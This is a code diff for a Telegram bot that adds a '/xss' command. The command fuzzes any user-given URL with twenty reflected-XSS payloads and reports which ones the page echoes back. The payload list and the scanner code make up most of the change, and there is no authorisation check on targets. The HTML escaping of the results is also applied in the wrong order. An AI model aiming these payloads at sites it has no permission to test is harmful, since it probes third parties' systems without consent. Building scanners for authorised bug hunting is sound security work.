@@ -1618,7 +1618,8 @@ async function startServer() {
                   `🌐 <b>WEB TOOLS:</b>\n` +
                   `• /qr [URL] - HD QR Code Gen.\n` +
                   `• /shortlink [URL] - TinyURL Generator.\n` +
-                  `• /port [PORT] - Cek deskripsi service port.\n\n` +
+                  `• /port [PORT] - Cek deskripsi service port.\n` +
+                  `• /xss [URL] - XSS Vuln Scanner (Bug Hunter).\n\n` +
                   `📊 <b>DATA / API UTILS:</b>\n` +
                   `• /weather [KOTA] - Info Cuaca API.\n` +
                   `• /crypto_price [COIN] - WebScrape Harga Kripto.\n` +
@@ -2409,6 +2410,79 @@ async function startServer() {
                       `━━━━━━━━━━━━━━━━━━━━`;
         ctx.reply(reply, { parse_mode: 'HTML' });
       } catch(e) { ctx.reply("❌ Error shortening link."); }
+    });
+
+    bot.command('xss', async (ctx) => {
+      const args = ctx.message.text.split(' ');
+      if (args.length < 2) {
+        return ctx.reply("❌ Format salah! Gunakan: /xss [URL]\nContoh: /xss https://example.com/search?q=");
+      }
+      
+      let targetUrl = args[1];
+      if (!targetUrl.startsWith('http')) {
+         targetUrl = 'http://' + targetUrl;
+      }
+    
+      const msgInfo = await ctx.reply(`🔍 <b>XSS VULNERABILITY SCANNER</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n⏳ <i>Memulai fuzzing dengan 20 payloads... Mohon tunggu (~5-15 detik).</i>`, {parse_mode: 'HTML'});
+      
+      const payloads = [
+        "\"<script>alert(1)</script>",
+        "'>\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "\"<svg/onload=alert(1)>",
+        "<body onload=alert(1)>",
+        "<iframe onload=alert(1)>",
+        "\"><input autofocus onfocus=alert(1)>",
+        "'-alert(1)-'",
+        "<details open ontoggle=alert(1)>",
+        "<marquee onstart=alert(1)>",
+        "<video><source onerror=\"alert(1)\">",
+        "javascript:alert(1)",
+        "javascript://%250Aalert(1)",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "\\\"autofocus onfocus=alert(1)//",
+        "</title><script>alert(1)</script>",
+        "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationend=\"alert(1)\"></b>",
+        "<a href=\"javascript:alert(1)\">XSS</a>",
+        "<object data=\"javascript:alert(1)\">",
+        "<math><mi>//</mi><x cx=\"</x><script>alert(1)</script>\">"
+      ];
+    
+      let vulnFound = 0;
+      let results = "";
+      
+      try {
+          const promises = payloads.map(async (p, idx) => {
+              try {
+                 const testUrl = targetUrl + encodeURIComponent(p);
+                 const response = await axios.get(testUrl, { timeout: 3500, validateStatus: () => true });
+                 const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
+                 if (body && body.includes(p)) {
+                    vulnFound++;
+                    results += `[${idx+1}] 🛑 <b>Payload Reflected!</b>\n🪲 <code>${p.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;')}</code>\n`;
+                 }
+              } catch (err) {
+                 // Ignore errors
+              }
+          });
+          
+          await Promise.all(promises);
+      } catch (e) {
+          // Fallback if request totally fails
+      }
+    
+      let finalMsg = `🔍 <b>XSS SCAN REPORT</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n`;
+      finalMsg += `🧪 <b>Payloads Tested:</b> 20\n⚠️ <b>Vulnerabilities Found:</b> ${vulnFound}\n\n`;
+      
+      if (vulnFound > 0) {
+         finalMsg += `<b>🚨 Reflected Payloads:</b>\n${results}\n`;
+         finalMsg += `💡 <i>Sistem mendeteksi payload ter-reflect di dalam response body tanpa sanitasi/escaping. Hal ini berpotensi mengeksekusi kode JavaScript arbitrer di browser pengguna.</i>`;
+      } else {
+         finalMsg += `✅ <b>Target tampaknya AMAN dari XSS Reflection (20 Basic Payloads Filtered / Sanitized).</b>\n`;
+         finalMsg += `🛡️ <i>WAF atau filter input backend aktif / tidak ada parameter reflect.</i>`;
+      }
+      
+      ctx.telegram.editMessageText(ctx.chat.id, msgInfo.message_id, undefined, finalMsg, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }}).catch(()=>{});
     });
 
     bot.command('pwd', (ctx) => {
